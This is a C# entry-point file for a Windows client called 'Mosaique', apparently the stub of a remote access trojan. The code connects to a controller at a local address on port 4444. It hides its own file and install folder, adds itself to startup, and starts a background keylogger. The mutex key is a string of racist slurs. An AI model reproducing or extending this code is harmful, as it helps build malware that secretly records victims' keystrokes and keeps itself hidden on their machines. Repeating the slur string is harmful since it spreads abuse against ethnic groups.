using Client.Controllers;
using Client.Controllers.Tools;
using Client.Models;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Client
{
    static class Program
    {
        public static ClientMosaique client;
        public static Boot bootController;
        private static ApplicationContext _msgLoop; // keylogger*
        private static bool _result;

        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            bootController = new Boot();

            //StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);// TODO virer
            //MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer           

            MutexController.mutexKey = "bougnoulonegroidomongolitoesclavago";// TODO virer            


            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (RunMosaique())
            {
                client = new ClientMosaique("127.0.0.1", 4444);
                //client = new ClientMosaic(bootController.host, bootController.port);
                client.connect();
            }
        }

        private static bool RunMosaique()
        {
            _result = MutexController.createMutex();// TODO virer

            if (!_result) // TODO virer
            {
                MessageBox.Show("Another instance of application is already running !");
                return false;
            }

            ClientData.installPath = Path.Combine(Boot.DIRECTORY, ((!string.IsNullOrEmpty(Boot.installSubDirectory)) ? Boot.installSubDirectory + @"\" : "") + Boot.installFileName); //  	Directory ~~== %USERPROFILE%\Application Data(\Roaming)

            // If install == false OR already installed
            if(!Boot.installStub || ClientData.currentPath == ClientData.installPath) 
            {
                if(Boot.installStub && Boot.hideFile) // INSTALL
                {
                    try
                    {
                        File.SetAttributes(ClientData.currentPath, FileAttributes.Hidden);
                    }
                    catch
                    {
                    }
                }
                if(Boot.installStub && Boot.hideSubDirectory && !string.IsNullOrEmpty(Boot.installSubDirectory)) // INSTALL
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.installPath));
                        di.Attributes |= FileAttributes.Hidden;
                    }
                    catch
                    {

                    }
                }

                if (Boot.autoStartEnabled) // STARTUP
                {
                    if (!Boot.AddToStartup())
                        ClientData.AddToStartupFailed = true;
                }
                if (Boot.keyloggerEnabled) // KEYLOGGER
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        Keylogger logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    })
                    { IsBackground = true }.Start();
                }

                return true;
            }
            else
            {
                MutexController.closeMutex();
                ClientInstallerController.install();
                return false;
            }
        }
    }
}
